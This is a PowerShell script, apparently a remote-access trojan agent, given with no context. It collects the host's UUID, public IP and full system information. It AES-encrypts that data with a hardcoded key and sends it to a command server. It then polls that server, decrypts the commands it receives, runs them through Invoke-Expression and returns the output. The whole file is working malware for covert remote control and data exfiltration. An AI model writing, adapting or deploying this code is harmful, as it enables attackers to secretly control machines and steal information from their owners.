
$ErrorActionPreference= 'silentlycontinue'

$SERVER_URL = "http://192.168.1.2/nopo/"
$UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
# start internal function
function SystemInfo {
    $IP = Invoke-RestMethod https://ident.me -UserAgent $UAG
    $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
    $INFO = Get-ComputerInfo
   
    # JSON SYSTEM INFO

    $SYSTEM = @{
        uuid      = "$UID"
        public_ip = "$IP"
        info      = $INFO
    }
 
    return $SYSTEM 
}

function EncryptString {
    Param ([string]$inputStr)

    $inputBytes = [System.Text.Encoding]::UTF8.GetBytes($inputStr)
    $enc = [System.Text.Encoding]::UTF8

    $AES = New-Object System.Security.Cryptography.AESManaged
    $iv = "&9*zS7LY%ZN1thfI"
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
    $AES.IV = $enc.GetBytes($iv)
    $AES.Key = $enc.GetBytes("123456789012345678901234r0hollah")

    $encryptor = $AES.CreateEncryptor()

    $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.length)
    $output = [Convert]::ToBase64String($encryptedBytes)

    return $output
}
function DcryptString {
    Param ([string]$inputStr)
    $data = [Convert]::FromBase64String($inputStr)
    $iv = "&9*zS7LY%ZN1thfI"
    $key = "123456789012345678901234r0hollah".PadRight(16, [char]0)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $utf8 = [System.Text.Encoding]::Utf8
    $aes.Key = $utf8.GetBytes($key)
    $aes.IV = $utf8.GetBytes($iv)
    $dec = $aes.CreateDecryptor()
    $RESULT = $dec.TransformFinalBlock($data, 0, $data.Length)
    $RESULTStr = $utf8.GetString($RESULT)
    Write-Output $RESULTStr
    $dec.Dispose()
}

function RunCommand {
    Param ([string]$inputStr)
    if ($inputStr -like "Terminate") {
        exit
    }

    return Invoke-Expression $inputStr | Out-String

}
# end internal function

while ($true) {
    $SYSTEM = SystemInfo 

    $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
    $CRYPT = EncryptString  $JSON
 
    $PARAM = @{
        DATA     = $CRYPT
        new_user = "ok"
    
    }
 
    Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG
   
    while ($true) {
       # Generate a random delay between 1 and 4 seconds
       $delay = Get-Random -Minimum 1 -Maximum 4s

       # Record the start time
       $startTime = Get-Date

        # Busy-wait loop that checks the elapsed time
        while (($currentTime = Get-Date) - $startTime -lt (New-TimeSpan -Seconds $delay)) {
            # No other tasks performed here, just checking the time
        }


        $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
        $SYSTEM = @{
            uuid = "$UID"
        }
        $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
        $CRYPT = EncryptString  $JSON

        $PARAM = @{
            DATA = $CRYPT
            
        }
         
        $RESULT = Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM  -UserAgent $UAG
        $REQ = DcryptString($RESULT)
        if ($REQ -ne "wait") {

            $JSON = $REQ | ConvertFrom-Json
            $MODE = $JSON.json
        
            $CMD = $JSON.cmd
            $RUN = RunCommand $CMD

            if ($RUN -eq "" -or $RUN -eq $null) {
                        $RUN = "No Result"
                    }
            
            
         
            $CMD_UID = $JSON.cmd_uid
            $SYSTEM = @{
                uuid    = "$UID"
                result  = "$RUN"
                cmd_uid = "$CMD_UID"
            }
            $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
         
            $CRYPT = EncryptString  $JSON

            $PARAM = @{
                DATA = $CRYPT
            
            }
         
            Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG
            
            
        }
    }
    
    
} 
